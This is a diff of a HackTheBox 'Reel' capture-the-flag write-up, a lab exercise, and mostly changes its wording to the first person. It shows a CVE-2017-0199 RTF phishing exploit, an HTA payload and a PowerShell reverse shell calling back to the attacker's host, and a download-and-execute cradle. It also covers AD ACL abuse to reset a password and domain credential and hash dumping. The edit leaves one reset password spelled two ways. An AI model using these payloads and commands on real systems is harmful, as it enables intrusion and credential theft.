@@ -3,14 +3,14 @@
 ---
 
 ## Summary
-Reel was a pretty tricky box, as the name implies, it involved a phishing attack, which is pretty uncommon in CTFs!  
-After obtaining command execution via phishing (using a malicious macro) we find an XML credential file allowing us to pivot to a new user.  
-Using bloodhound (after some proxying) we can eventually find out this user can abuse ACLs to reset the password of another user.  
-This new user has GenericWrite over a group with full access to the filesystem, meaning we can add our controlled users to this group.
+Reel was a pretty tricky box, as the name implies, it involved a phishing attack, which is pretty uncommon in CTFs. 
+After obtaining command execution via phishing (using a malicious macro) I found an XML credential file allowing me to pivot to a new user.  
+Using bloodhound (after some proxying) I  eventually found out that the user can abuse ACLs to reset the password of another user.  
+This new user has GenericWrite over a group with full access to the filesystem, meaning I can add the controlled users to this group.
 
 ## Foothold
 
-Let's kick things off with an autoscan (alias for [nmapAutomator.sh](https://github.com/21y4d/nmapAutomator))
+I'll start with autoscan (alias for [nmapAutomator.sh](https://github.com/21y4d/nmapAutomator))
 
 ```bash
 ┌──(kali㉿kali)-[~/…/HTB/hard/reel/foothold]
@@ -47,7 +47,7 @@ PORT      STATE SERVICE
 593/tcp   open  http-rpc-epmap
 49159/tcp open  unknown
 ```
-Running a script scan we get the following
+Running a script scan I get the following
 ```bash
 PORT    STATE SERVICE     VERSION
 21/tcp  open  ftp         Microsoft ftpd
@@ -93,7 +93,7 @@ Host script results:
 |_    Message signing enabled and required
 |_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s
 ```
-So from this we know some  interesting stuff:
+So from this I know some  interesting stuff:
 - Anonymous FTP is available
 - The domain name is likely HTB.LOCAL and the hostname is REEL
 - There's an SMTP daemon running on port 25
@@ -101,7 +101,7 @@ So from this we know some  interesting stuff:
 - The server is likely a Windows 2012 server
 
 ### FTP
-Let's take a look at FTP.
+I'll take a look at FTP.
 ```bash
 ftp> ls
 229 Entering Extended Passive Mode (|||41009|)
@@ -118,7 +118,7 @@ ftp> ls
 10-31-17  10:13PM                14581 Windows Event Forwarding.docx
 ```
 Looks like some interesting files.  
-Let's download them, and take a look.
+I'll download them, and take a look.
 
 #### readme.txt
 ```
@@ -144,13 +144,13 @@ gpupdate /force (force checkin, get subscriptions)
 check Microsoft/Windows/Eventlog-ForwardingPlugin/Operational for errors
 ```
 
-So from these files we can deduce
+So from these files I can deduce
 - There's someone receiving RTF files and converting them to .docx files which are then saved to the FTP server
 - AppLocker is in effect for exe,msi,ps1,vbs,cmd,bat and js files in **HASH** mode.
 - There's potential hosts WEF.HTB.LOCAL and LAPTOP12.HTB.LOCAL
 - It looks like Windows Event Log forwarding is in place and is being sent to WEF.HTB.LOCAL
 
-If we found the name of the user receiving the mail, we might be able to createl a malicious RTF document?
+If I found the name of the user receiving the mail, I might be able to create a malicious RTF document?
 
 ### SMTP (Port 25)
 
@@ -165,7 +165,7 @@ Unfortunately, these methods don't work... VRFY and EXPN don't work, and RCPT TO
 The OpenSSH version **might** be [vulnerable](https://github.com/sriramoffcl/OpenSSH-7.6p1-Exploit-py-/tree/master), as it's running version 7.6 but attempts to exploit it didn't work
 
 ### RPC (Port 593)
-We can actually connect to RPC anonymously using
+I can connect to RPC anonymously using
 ```bash
 rpcclient reel.htb.local -U "" -N
 rpcclient $> enumdomusers
@@ -174,7 +174,7 @@ rpcclient $> querydispinfo
 result was NT_STATUS_ACCESS_DENIED
 ```
 But easy enumeration commands (enumdomusers,enumdomgroups, etc) aren't allowed...
-We do get something
+I do get something
 ```bash
 rpcclient $> lsaquery
 Domain Name: HTB
@@ -183,8 +183,8 @@ Domain Sid: S-1-5-21-2648318136-3688571242-2924127574
 But everything else fails.
 
 ### Exiftool
-As some of the files we found in FTP were .docx files, they **might** contain metadata relating to a user. 
-No usernames were returned from AppLocker.docx, but the Windows Event Forwarding.docx actually contains an email!
+As some of the files found in FTP were .docx files, they **might** contain metadata relating to a user. 
+No usernames were returned from AppLocker.docx, but the Windows Event Forwarding.docx actually contains an email.
 ```bash
 ┌──(kali㉿kali)-[~/…/HTB/hard/reel/foothold]
 └─$ exiftool 'Windows Event Forwarding.docx'
@@ -195,17 +195,17 @@ File Name                       : Windows Event Forwarding.docx
 Zip File Name                   : [Content_Types].xml
 Creator                         : nico@megabank.com <--------- [Oops...]
 ```
-So we have a target, now to construct an exploit.
+So I have a target, now to construct an exploit.
 
 ### RTF
 
-A bit of googling finds this, which looks somewhat promising [CVE-2017-0199 script](https://www.exploit-db.com/exploits/41894).  
+A bit of googling finds this, which looks promising [CVE-2017-0199 script](https://www.exploit-db.com/exploits/41894).  
 Now this box was released in 2018, so it lines up pretty well that this would've been **relatively** recent news on release.  
 
 A high-level flow of the exploit is as follows - [Source](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)
 
 1 - Embed an OLE2 link object in to a Word or RTF document
-2 - Set the link to an attacker-controlled URL (e.g. https://evil.com/evil.hta)
+2 - Set the link to an attacker-controlled URL (e.g. https://evil[.]com/evil.hta)
 3 - Manually edit the object in a text editor to give it the \\objupdate control
 4 - Send it to a victim
 5 - Victim opens the document
@@ -217,7 +217,7 @@ From the [RTF Spec](https://www.biblioscape.com/rtf15_spec.htm)
 \objupdate
 Forces an update to the object before displaying it. Note that this will override any values in the <objsize> control words, but reasonable values should always be provided for these to maintain backwards compatibility.
 ```
-Anyway, the script provided has 2 nice features, it allows for an autopwn (no fun) or a more manual method. I opted for something a bit different...
+Anyway, the script provided has 2 nice features, it allows for an autopwn (no fun) or a more manual method. I opted for a different approach.
 
 #### Step 1 - Test it works!
 Using the script, I created a basic payload to check if my .hta file was being fetched
@@ -249,7 +249,7 @@ sendEmail
 Sep 24 06:34:48 kali sendEmail[49518]: Email was sent successfully!
 ```
 
-A couple seconds later, boom!
+A couple seconds later
 
 ```
 10.10.10.77 - - [24/Sep/2023 06:51:23] code 404, message File not found
@@ -257,7 +257,7 @@ A couple seconds later, boom!
 ```
 
 #### Step 2 - Test for code execution
-There's no guarantee that the .hta file will actually be executed, although it is very likely. So I'll test to make sure we have command execution.
+There's no guarantee that the .hta file will actually be executed, although it is very likely. So I'll test to make sure I have command execution.
 
 I'll use this .hta file [here](https://github.com/k4sth4/Malicious-HTA-File) as a template.
 
@@ -283,9 +283,9 @@ I'll use this .hta file [here](https://github.com/k4sth4/Malicious-HTA-File) as 
 
 ```
 
-When we send this, we should see 2 different callbacks. One for /test.hta and another for /pwned.
+When I send this, I should see 2 different callbacks. One for /test.hta and another for /pwned.
 
-And sure enough, we see it.
+And sure enough, I see it.
 
 ```bash
 10.10.10.77 -[24/Sep/2023 06:58:37] "GET /evil.hta HTTP/1.1" 200 
@@ -294,14 +294,14 @@ And sure enough, we see it.
 
 ```
 
-Code execution achieved!
+Code execution achieved.
 
 #### Step 3 - Automate it
 To speed things up, I'll automate the process of generating the rtf file and sending an email.
 
 The full code is [here](https://github.com/Henryisnotavailable/HTB/blob/main/REEL/evil_rtf.py)
 
-All that's needed is to create a .hta file that gives us a reverse shell. Because we know powershell is allowed (because Invoke-WebRequest worked), it's probably best to use that, rather than trying to get netcat on the machine, or using an msfvenom reverse shell.
+All that's needed is to create a .hta file that gives us a reverse shell. Because I know powershell is allowed (because Invoke-WebRequest worked), it's probably best to use that, rather than trying to get netcat on the machine, or using an msfvenom reverse shell.
 
 The final .hta file looks like this
 ```html
@@ -366,7 +366,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)  {
 $client.Close()
 ```
 
-Anyway, saving that file and sending the email works!
+Saving that file and sending the email works.
 ```bash
 python3 send_email.py payload.rtf http://10.10.16.2/evil.hta 10.10.10.77 mrevil@evil.com nico@megabank.com
 
@@ -376,7 +376,7 @@ Sep 24 10:13:32 kali sendEmail[92718]: Email was sent successfully!
 [+] Ok, done. Cleaning up...
 ```
 
-We get an HTTP request
+I get an HTTP request
 
 ```bash
 10.10.10.77 - - [24/Sep/2023 09:54:57] "GET /evil.hta HTTP/1.1" 200 -
@@ -394,7 +394,7 @@ htb\nico
 PS C:\Windows\system32>
 ```
 
-We can now grab user.txt
+I can now grab user.txt
 ```powershell
 PS C:\> cat C:\Users\nico\desktop\user.txt
 
@@ -419,10 +419,10 @@ Interestingly there's a file called cred.xml on Nico's desktop...
 </Objs>
 ```
 
-Now this seems to have the **encrypted** password of Tom. The key used to encrypt PSCredentials is unique per **device** and **user** who encrypted, so we might be lucky that it was Nico who encrypted it. So we can decrypt it, as Nico.
+Now this seems to have the **encrypted** password of Tom. The key used to encrypt PSCredentials is unique per **device** and **user** who encrypted, so I might be lucky that it was Nico who encrypted it.
 
-And we are lucky!
-Running the following commands gets us the password
+And I am lucky.
+Running the following commands gets the password
 ```powershell
 $credentials = Import-Clixml -Path C:\users\nico\Desktop\cred.xml
 $credentials.GetNetworkCredential().password
@@ -441,7 +441,7 @@ SMB         htb.local       445    REEL             [+] HTB.LOCAL\tom:1ts-mag1c!
 Magic indeed.
 
 The password didn't work for any other users.
-We do get SSH access as Tom, though. 
+I do get SSH access as Tom, though. 
 ```bash
 hydra -L users -p '1ts-mag1c!!!' ssh://htb.local -t 2                                                   
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -454,20 +454,20 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-24 10:31:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-24 10:31:29
 ```
 ### Desktop
-Well it get's a bit too convenient... In Tom's Desktop is an AD Audit folder with bloodhound.exe, PowerView.ps1, Readme.txt and a file called ACLS.csv.
+Well it gets a bit too convenient. In Tom's Desktop is an AD Audit folder with bloodhound.exe, PowerView.ps1, Readme.txt and a file called ACLS.csv.
 ```
 Findings:                                                                                                     
 
-Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                
+No AD attack paths from user to Domain Admin (using default shortest path query).                
 
-Maybe we should re-run Cypher query against other groups we've created.
+Maybe I should re-run Cypher query against other groups I've created.
 ```
 
-A bit too hand-holdy but oh well :( I'm going to ignore the installed stuff and pretend it's not there.
+A bit hand-holdy but oh well, I'm going to ignore the installed stuff and pretend it's not there.
 
 This host is actually a Domain Controller, but the majority of the AD-related ports are behind a firewall, as they're accessible from localhost but not from kali. 
 
-To solve this we can port forward / proxy through SSH to localhost, bypassing the firewall.
+To solve this I can port forward / proxy through SSH to localhost, bypassing the firewall.
 
 #### Proxy Setup
 
@@ -477,7 +477,7 @@ Setup a proxy through SSH using dynamic port forwarding
 ssh -D 4124 -Nf tom@htb.local 
 ```
 
-Now to actually use this proxy we need to use proxychains which hooks the libraries and forces them through the SOCKS proxy we specify in the proxychains.conf
+Now to actually use this proxy I need to use proxychains which hooks the libraries and forces them through the SOCKS proxy I specify in the proxychains.conf
 
 The only required modification to the default file is adding this line to the bottom.
 ```
@@ -486,12 +486,12 @@ socks5  127.0.0.1 4124
 
 Make a copy of the /etc/proxychains.conf in your current directory to avoid breaking the template file.
 
-Now when we run
+Now when I run
 ```bash
 proxychains4 nmap 127.0.0.1 -p 88
 ```
 
-We get an open port! (Albeit after some time...)
+I get an open port. (Albeit after some time...)
 
 ```bash
 [proxychains] config file found: /home/kali/CTFs/HTB/hard/reel/root/proxychains.conf
@@ -509,18 +509,17 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
 ```
 
-What we can do now is run the python version of bloodhound (which is remote!) 
+What I can do now is run the python version of bloodhound (which is remote) 
 
-The problem is that for some reason the script won't resolve hostnames like `_ldap._tcp.pdc._msdcs.htb.local` , this is actually being caused because DNS typically uses UDP (which can't be proxied over SOCKS or port forwarded (AFAIK)). Unfortunately, the server doesn't offer DNS over TCP, so using the flag --dns-tcp in bloodhound doesn't work :(. 
+The problem is that for some reason the script won't resolve hostnames like `_ldap._tcp.pdc._msdcs.htb.local` , this is actually being caused because DNS typically uses UDP (which can't be proxied over SOCKS or port forwarded (AFAIK)). Unfortunately, the server doesn't offer DNS over TCP, so using the flag --dns-tcp in bloodhound doesn't work. 
 
 Using /etc/hosts also won't work because it's looking for a `SRV` record not an `A` record.
 
-So why not setup a mini DNS server and create the SRV records that point the SRV record of `_ldap._tcp.pdc._msdcs.htb.local` to localhost?
+So the next logical step it to setup a small DNS server and create SRV records that point the SRV record of `_ldap._tcp.pdc._msdcs.htb.local` to localhost?
 
 `dnsmasq ` looks to be the perfect tool for this.
 
-
-So a few monkey patches later I get it to work :0
+So a few monkey patches later I get it to work.
 
 ##### Step 0
 Install dnsmasq
@@ -550,27 +549,27 @@ sudo systemctl start dnsmasq
 ```
 
 ##### Step 4
-Sync up your time with the DC to ensure kerberos works (I'll probably do a future post on Kerberos). Again this is painful because NTP uses UDP! So we can't easily use 
+Sync up your time with the DC to ensure kerberos works. Again this is painful because NTP uses UDP! So I can't easily use 
 ```
 proxychains rdate -n 127.0.0.1
 ```
 
-Instead we have to get the UNIX timestamp on the DC and then just set ours to that. [Source](https://stackoverflow.com/questions/4192971/in-powershell-how-do-i-convert-datetime-to-unix-time)
+Instead I have to get the UNIX timestamp on the DC and then just set mine to that. [Source](https://stackoverflow.com/questions/4192971/in-powershell-how-do-i-convert-datetime-to-unix-time)
 ```powershell
 PS C:\Users\tom> $unixEpochStart = new-object DateTime 1970,1,1,0,0,0,([DateTimeKind]::Utc)                         
 PS C:\Users\tom> [int]([DateTime]::UtcNow - $unixEpochStart).TotalSeconds
 12341251251
 ```
 
-And then on our host run
+And then on my host run
 ```bash
 sudo date +%s -s @<OUTPUT OF PREVIOUS POWERSHELL COMMAND>
 ```
 
 ##### Step 5
-Finally you can run it through proxychains without dropping anything to the disk or requiring any applocker bypass /exceptions :)
+Finally I can run it through proxychains without dropping anything to the disk or requiring any applocker bypass /exceptions :)
 ```shell
-roxychains bloodhound-python -d htb.local -c all -u tom -p '1ts-mag1c!!!' -dc reel.htb.local -ns 127.0.0.1 --zip
+proxychains bloodhound-python -d htb.local -c all -u tom -p '1ts-mag1c!!!' -dc reel.htb.local -ns 127.0.0.1 --zip
 [proxychains] config file found: /home/kali/CTFs/HTB/hard/reel/root/proxychains.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.16
@@ -602,13 +601,13 @@ INFO: Done in 00M 07S
 INFO: Compressing output into 20230924133241_bloodhound.zip
 ```
 
-Now let's upload `20230924133241_bloodhound.zip` to bloodhound!
+Now I'll upload `20230924133241_bloodhound.zip` to bloodhound.
 
 ### Bloodhound analysis
 
-Looking at Bloodhound, we can identify a possible attack path.
+Looking at Bloodhound, I can identify a possible attack path.
 
-Our user Tom has "First Degree Object Control" over CLAIRE[at]HTB.LOCAL.
+Tom has "First Degree Object Control" over CLAIRE[at]HTB.LOCAL.
 
 Full output from bloodhound
 ```js
@@ -617,19 +616,19 @@ The user TOM@HTB.LOCAL has the ability to modify the owner of the user CLAIRE@HT
 Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.
 ```
 
-Interestingly, Claire has WriteDacl and GenericWrite over the group BACKUP_ADMINS, meaning we can add anyone (like Tom) to the group.
+Interestingly, Claire has WriteDacl and GenericWrite over the group BACKUP_ADMINS, meaning I can add anyone (like Tom) to the group.
 
 #### Step 1 Gain Access to Claire's account
-We can use PowerView to set our account (Tom) as the owner, modify the permissions that Tom has over Claire and then use those permissions to change the password of Claire.
+I can use PowerView to set my account (Tom) as the owner, modify the permissions that Tom has over Claire and then use those permissions to change the password of Claire.
 
 
-First we need to setup a Credential Object
+First I need to setup a Credential Object
 ```powershell
 $SecPassword = ConvertTo-SecureString '1ts-mag1c!!!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('HTB\Tom', $SecPassword)
 ```
 
-Then load SharpView. There's actually an AppLocker policy that lets us run it, 
+Then load SharpView. There's actually an AppLocker policy that lets me run it, 
 
 ```powershell
 PS> Get-AppLockerPolicy -Effective | Select -Expand RuleCollections
@@ -641,36 +640,36 @@ Action         : Allow
 ```
 
 
-But we can just load it in memory after retrieving the PowerView.ps1 file hosted on our HTTP server on Kali.
+But I can just load it in memory after retrieving the PowerView.ps1 file hosted on my HTTP server on Kali.
 ```powershell
 iex(new-object net.webclient).DownloadString("http://10.10.16.5:8000/PowerView.ps1")
 ```
 
-Let's set ourselves as the owner Claire's account
+I set myself as the owner Claire's account
 ```powershell
 Set-DomainObjectOwner -Credential $Cred -Identity claire -OwnerIdentity tom
 ```
 
-Then grant ourselves **full** access (GenericAll) to Claire's account
+Then grant myself **full** access (GenericAll) to Claire's account
 ```powershell
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity claire -Rights All -PrincipalIdentity tom
 ```
 
-We can then reset the account by generating a new password (in the SecureString format)
+I can then reset the account by generating a new password (in the SecureString format)
 ```
-$newpass = ConvertTo-SecureString -String "YouGotHacked!9" -Force -AsPlainText
+$newpass = ConvertTo-SecureString -String "YouGotHacked9" -Force -AsPlainText
 ```
 And then setting it
 ```
 Set-DomainUserPassword -Identity claire -AccountPassword $newpass
 ```
 
-(You could also use this, but it's more likely to be detected)
+(I could also use this, but it's more likely to be detected)
 ```
-net user claire 'YouGotHacked!9' /domain
+net user claire 'YouGotHacked9' /domain
 ```
 
-And we can test it over SMB.
+And I can test it over SMB.
 
 ```bash
 crackmapexec smb htb.local -u 'claire' -p 'YouGotHacked!9' --shares
@@ -681,7 +680,7 @@ SMB         htb.local       445    REEL             [+] Enumerated shares
 
 #### Step 2 As Claire add Tom to the BACKUP_ADMINS group
 
-First we need to generate a new CredentialObject to act as Claire
+First I need to generate a new CredentialObject to act as Claire
 ```powershell
 $SecPassword = ConvertTo-SecureString 'YouGotHacked!9' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $SecPassword)
@@ -712,7 +711,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $SecP
 Add-DomainGroupMember -Identity 'BACKUP_ADMINS' -Members 'Tom' -Credential $Cred
 ```
 
-We can check it works using
+I can check it works using
 ```powershell
 get-domaingroupmember -identity backup_admins                                                      
 
@@ -735,7 +734,7 @@ MemberDistinguishedName : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL
 MemberObjectClass       : user                                                                                      
 MemberSID               : S-1-5-21-2648318136-3688571242-2924127574-1107 
 ```
-Now this user seems to have extended access to the file system, as when trying to access the Administrator's directory (after re-logging in over SSH as Tom) we can see it.
+Now this user seems to have extended access to the file system, as when trying to access the Administrator's directory (after re-logging in over SSH as Tom) I can see it.
 
 In the desktop there's a Backup Scripts folder, and in one of the files, I find this...
 
@@ -746,7 +745,7 @@ $password="Cr4ckMeIfYouC4n!"
 
 Lovely :)
 
-We can verify this password using crackmapexec
+I can verify this password using crackmapexec
 
 ```bash
 crackmapexec smb htb.local -u 'administrator' -p 'Cr4ckMeIfYouC4n!' --shares 
@@ -763,7 +762,7 @@ SMB         htb.local       445    REEL             NETLOGON        READ,WRITE  
 SMB         htb.local       445    REEL             SYSVOL          READ            Logon server share 
 ```
 
-So now we can use smbexec.py from impacket to run as SYSTEM 
+So now I can use smbexec.py from impacket to run as SYSTEM 
 ```bash
 /usr/share/doc/python3-impacket/examples/smbexec.py 'htb.local/administrator:Cr4ckMeIfYouC4n!@10.10.10.77'
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -773,14 +772,14 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-Now we can grab root.txt
+Now I can grab root.txt
 ```powershell
 C:\Windows\system32>type c:\users\administrator\desktop\root.txt
 67f024ca1810816cf1e98b15ec33a11a
 ```
 
 
-For fun we can also dump all of the hashes of the domain using secretsdump.py from Impacket
+For fun I can also dump all of the hashes of the domain using secretsdump.py from Impacket
 ```bash
 /usr/share/doc/python3-impacket/examples/secretsdump.py 'htb.local/administrator:Cr4ckMeIfYouC4n!@10.10.10.77'
 
@@ -815,7 +814,7 @@ HTB.LOCAL\rosie:1605:aad3b435b51404eeaad3b435b51404ee:615c5c68f4852726fd0717cc63
 ## Security Flaws
 One thing I like doing, is thinking about how to patch the system that I just exploited. What are some of the misconfigurations the author intentionally created?
 
-0. Wide open ports - Services like FTP,SSH,SMB and SMTP should not be wide open, especially if **no** authentication is required (like we saw when using SMTP and FTP).
+0. Wide open ports - Services like FTP,SSH,SMB and SMTP should not be wide open, especially if **no** authentication is required (like I saw when using SMTP and FTP).
 1. Lack of user awareness - The user (Nico) opened a random email from mrevil@evil.com and opened the attachment.
 2. Lack of patching - The patch for CVE-2017-0199 was released in April. This box was released in June 2018, leaving almost a year where the patch was not applied.
 3. Plaintext credentials(ish) - The user Nico should **not** have the credentials of **Tom** even if in encrypted form, as if Nico is compromised then so is Tom. Same goes for the Admin user with **Domain Admin** credentials stored in plaintext.
